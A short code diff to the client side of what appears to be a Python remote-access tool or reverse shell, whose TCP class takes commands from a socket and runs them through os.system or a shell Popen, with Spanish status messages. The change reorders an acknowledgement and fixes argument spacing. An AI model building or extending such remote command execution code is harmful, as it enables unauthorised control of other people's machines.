@@ -1,3 +1,4 @@
+## Client
 import socket
 import os
 import getpass
@@ -891,11 +892,11 @@ class TCP:
                 else:
                     try:
                         if cmd.lower()[:4] == "open":
+                            self.__sock.send("[+] Comando ejecutado".encode())
                             if self.__myOs == "linux" or self.__myOs == "darwin":
-                                os.system(cmd[:4].lower() + cmd[5:])
+                                os.system(cmd[:4].lower() + ' ' + cmd[5:])
                             if self.__myOs == "windows":
                                 os.system(cmd[5:])
-                            self.__sock.send("[+] Comando ejecutado".encode())
 
                         else:
                             comando = Popen(cmd, shell=PIPE, stdin=PIPE, stdout=PIPE, stderr=PIPE)
